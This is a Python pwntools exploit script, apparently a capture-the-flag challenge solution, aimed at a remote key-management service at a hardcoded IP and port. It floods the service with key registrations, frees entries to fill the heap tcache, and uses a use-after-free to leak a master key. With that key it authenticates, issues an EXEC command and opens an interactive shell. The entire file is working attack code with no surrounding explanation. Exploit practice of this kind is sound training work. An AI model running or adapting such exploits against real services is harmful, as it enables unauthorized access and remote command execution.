#!/usr/bin/python3

from pwn import *
import secrets
import string
from time import sleep

HOST, PORT = "94.237.59.199", 44773
io = remote(HOST, PORT)

def reg(pair):
    io.sendline(b"REKE " + pair)
    if io.readuntil(b"Registered: ID"):
        return True
    return False


def auth(Id):
    io.sendline(b"AUTH " + str(Id).encode())

def delk(Id):
    io.sendline(b"DEKE " + str(Id).encode())
    if io.readuntil(b"successfuly"):
        return True
    return False

def save(Id):
    io.sendline(b"SAVE " + str(Id).encode())
    if io.readuntil(b"Saved"):
        return True
    return False

def reload_db():
    io.sendline(b"RLDB")

def gen(length):
    alphabet = string.ascii_letters + string.digits
    return (''.join(secrets.choice(alphabet) for _ in range(length))).encode()

io.timeout = 10

log.info("Register and save the keys into the database to increase the file size...")


for i in range(1, 15):
    prog = log.progress("Registering new key", "...")
    key = b"hacker" + gen(1) + b":user " + gen(68) + b";"
    
    if reg(key):
       prog.success(key.decode())
    else:
       prog.failure(key.decode())

    prog = log.progress("Saving key: ", "...")
    
    if save(1):
       prog.success("Saved")
    else:
       prog.failure("Not Saved")
    
    delk(1)
    sleep(1)

for i in range(1, 8):
    reg(key)

MASTER_KEY = b"master:user " + gen(68) + b";"

log.info("Exploiting UAC")
log.info("Save the master key.")
reg(MASTER_KEY)
save(8)
reload_db()
auth(8)

log.info("Fill up tcache")

for i in range(1, 9):
    sleep(1)
    delk(i)
    
reload_db()

io.clean()
log.info("Getting master key...")

io.sendline(b"GTPR") # Getting the master key using the use-after-free
leak = io.readline()[9:-1]
log.info("Master key: {}".format(leak.decode()))

log.info("Authenticate with master key")
sleep(1)
reg(leak)
io.readuntil(b"->")
ID = io.readline()

auth(int(ID[:-1]))
sleep(1)
io.sendline(b"EXEC")
io.interactive()
